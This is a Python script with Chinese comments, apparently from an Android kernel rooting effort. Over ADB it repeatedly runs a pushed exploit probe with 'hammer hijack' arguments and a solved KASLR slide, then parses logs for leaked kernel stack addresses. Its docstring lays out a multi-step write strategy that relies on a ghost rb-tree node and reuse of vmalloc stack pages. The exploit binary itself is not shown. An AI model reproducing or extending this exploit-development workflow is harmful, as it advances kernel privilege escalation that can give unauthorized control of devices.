#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""stackreuse.py —— 同一个 boot 里连续起 N 次探针, 只看每次泄漏出来的 S 稳不稳定。

为什么先测这个: "一幽灵一发写"已经坐实 ⇒ 多笔写要靠多次进程调用。
而"先写 leftmost=S, 再让 rb_next 把真节点地址写进 .data 槽"这种三步棋,
只有在**不同进程的幽灵节点落在同一个栈地址 S** 时才走得通
(vmalloc 栈是 first-fit 分配, 前一个进程退出后它的栈页极可能被下一个进程原样复用)。
"""
import io, os, re, subprocess, sys, time

BASE = r'G:\项目\Windows管理\usb\临时root'
HERE = os.path.join(BASE, 'cm57')
src = io.open(os.path.join(HERE, 'auto.py'), encoding='utf-8').read().split('def main()')[0]
A = {}
exec(compile(src, 'auto.py', 'exec'), A)
sh, solve_slide, build = A['sh'], A['solve_slide'], A['build']
ADB, DEV = A['ADB'], A['DEV']

N = int(sys.argv[1]) if len(sys.argv) > 1 else 3
NAMES = sys.argv[2:] if len(sys.argv) > 2 else []
EXTRA = [a for a in NAMES if not a.startswith('--')] or ['nph=0']
build()
sh([ADB, '-s', DEV, 'shell', 'wait-for-device'], timeout=300)
if '--fresh' in NAMES:
    A['fresh_boot']()
slide = solve_slide()
print('slide=%x' % slide, flush=True)
sh([ADB, '-s', DEV, 'push', os.path.join(HERE, 'prbin'), '/data/local/tmp/pr'])
for i in range(N):
    sh([ADB, '-s', DEV, 'shell', 'rm', '-f', '/data/local/tmp/pr.log'], timeout=30)
    cmd = "chmod 755 /data/local/tmp/pr; /data/local/tmp/pr %x hammer hijack shape2 ncopy5 %s" % (slide, EXTRA[i % len(EXTRA)])
    r = sh([ADB, '-s', DEV, 'shell', cmd], timeout=200)
    up = (sh([ADB, '-s', DEV, 'shell', 'cat /proc/uptime'], timeout=20).stdout or '?').split()
    log = (sh([ADB, '-s', DEV, 'shell', 'cat /data/local/tmp/pr.log'], timeout=40).stdout or '')
    m = re.findall(r'\[scan\] name\+\d+ = ([0-9a-f]{16})', log)
    print('#%d rc=%s uptime=%s S=%s' % (i, r.returncode, up[0] if up else '?',
                                        ' '.join(m) or '(没泄漏到)'), flush=True)
    if 'DONE' not in log:
        print('   ! 这一轮没走到 DONE(可能炸了):', log[-200:], flush=True)
        time.sleep(20)
        slide = solve_slide()
        print('   重采 slide=%x' % slide, flush=True)
